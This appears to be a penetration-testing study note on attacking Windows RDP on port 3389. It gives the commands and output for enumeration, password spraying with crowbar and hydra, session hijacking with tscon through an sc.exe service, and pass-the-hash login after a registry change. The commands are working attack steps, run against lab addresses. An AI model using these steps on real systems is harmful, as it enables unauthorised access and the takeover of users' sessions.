---
title: Port 3389 - RDP
draft: false
tags:
  - rdp
---
Most commonly used among administrators.

## Enumeration

```shell-session
[!bash!]# nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

## Password Spraying
### crowbar

```shell-session
[!bash!]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

### hydra

```shell-session
[!bash!]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

## Login

```shell-session
[!bash!]# rdesktop -u admin -p password123 192.168.2.143
```


## Attacks
### RDP Session Hijacking

Let's say we have successfully log-in to RDP and we have local administrator privilege. 

We can hijack other user's session. 

To impersonate a user without their password:
- Need to have SYSTEM privilege
- Use Microsoft tscon.exe binary (tscon.exe allows users to connect to another desktop session)

First use the command `query user` and identify the ID of the use we want to impersonate. 

After identifying, impersonate:

```cmd-session
C:\Desktop> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

What if we don't have SYSTEM privilege? We can escalate our privilege using mimikatz etc or by using `sc.exe`.

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

Now run below and new terminal with the lewen user session will appear:

```cmd-session
C:\htb> net start sessionhijack
```

### PtH

`Restricted Admin Mode` is needed to be enabled (disabled by default).

We can enable this by adding a new registry key `DisableRestrictedAdmin` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`.

```cmd-session
C:\Desktop> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once it is added, log-in:

```shell-session
[!bash!]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

